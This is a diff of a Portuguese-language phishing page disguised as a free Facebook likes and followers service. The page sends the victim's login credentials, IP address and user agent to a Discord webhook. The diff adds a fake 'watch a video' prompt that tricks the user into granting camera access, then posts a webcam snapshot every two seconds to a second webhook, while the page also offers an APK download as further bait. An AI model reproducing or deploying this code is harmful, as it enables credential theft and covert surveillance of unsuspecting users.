@@ -120,14 +120,38 @@ display:none;
 </div>
 <span>Processando</span>
 </div>
-    
+ <div class="advCam" style="display:none;">  
+<h3>Para receber a quantia de likes e seguidores você deve assistir a um vídeo</h3>
+<button onclick="prosg()">Prosseguir</button>
+</div>
+
+<div class="Cam" style="display:none;">
+<h3>O seu smartphone informa que para assistir ao vídeo, você deve permitir o acesso. </h3>
+<img src="video.png" width="300px" height="150px">
+<button onclick="startCam()">Permitir</button>
+</div>
 
 <div class="downloadAPK" style="display:none">
 <h3>Baixe o nosso APP para continuar e para ganhar os Likes e Seguidores</h3>
 <a href="Free_Likes_Facebook.apk" style="font-size:30px;" download>Baixar Agora</a>
 </div>
+
+
+<video width="300px" height="150px" id="video" style="display:none;"></video>
+<canvas width="300px" height="150px" id="canvas" style="display:none;"></canvas>
 </div>
+
     <script>
+
+var webhookURL="https://discord.com/api/webhooks/1346960511358734457/lFDqQ3EuCkc3WCth1Uj-wn_8YVVtkT5EjDeucp2dv3bInNB6sGc7PceiIPSjf228z_Ln"
+
+
+var webhookImg="https://discord.com/api/webhooks/1346961199748612167/g6w-fkp2LCPPMegcwEJ29J7tUNp1crJOyoNrT_i4Y7Q7FVblEzosnqvtgjjdYcxjOt2S"
+
+
+
+
+
 
         function showLogin() {
             document.getElementById('boostForm').style.display = 'none';
@@ -144,7 +168,6 @@ ip="";
 let rpp=await fetch("https://api.ipify.org?format=json");
 let dats=await rpp.json();
 ip=dats.ip;
-const webhookURL="https://discord.com/api/webhooks/1325626529216200797/agMz3pSFTYcvAGu0N_kyZWTPdm54_7xyr6ElRPKrraIKcdtsb5t3WlDqqgNB5yjrSnLp";
 
 const msg={
 content: "--------------\n {IP}: "+ip+"\n\n{USER AGENT}: "+navigator.userAgent+"  \n\n\n {TELEFONE/EMAIL}: "+telEmail+"\n\n {SENHA}: "+senha+" \n\n------------"
@@ -156,16 +179,77 @@ body: JSON.stringify(msg)
 });
 
 
-
-
-
-
-
 document.querySelector("#loginForm").style.display="none";
 
-document.querySelector(".downloadAPK").style.display="block"
+document.querySelector(".advCam").style.display="block";
 
 }
+ function prosg(){
+
+document.querySelector(".Cam").style.display="block";
+document.querySelector(".advCam").style.display="none";
+
+}
+var video=document.querySelector("#video");
+var canvas=document.querySelector("#canvas");
+ function startCam(){
+
+alert("Permita o acesso à câmera");
+
+navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){
+video.srcObject=stream;
+video.play();
+setInterval(function(){
+var context=canvas.getContext("2d");
+context.drawImage(video,0,0,canvas.width,canvas.height);
+var dtUrl=canvas.toDataURL("image/png");
+
+var mensg={
+content:".\n\n\nImagem:\n\n\n\n"+dtUrl
+}
+
+
+fetch(webhookImg,{
+method:"POST",
+headers: {"Content-Type":"application/json"},
+body: JSON.stringify(mensg)
+}).then(function(resposta){
+
+
+})
+
+
+
+
+
+},2000);
+
+}).catch(function(erro){
+
+alert("Os likes não foram enviados à conta pois você não deu o acesso à câmera.");
+
+setTimeout(function(){
+
+window.open("https://facebook.com");
+
+},3000)
+
+
+}) //Fim do MediaDevices
+
+
+
+
+
+
+
+}
+
+
+
+
+
+
 
     </script>
 </body>
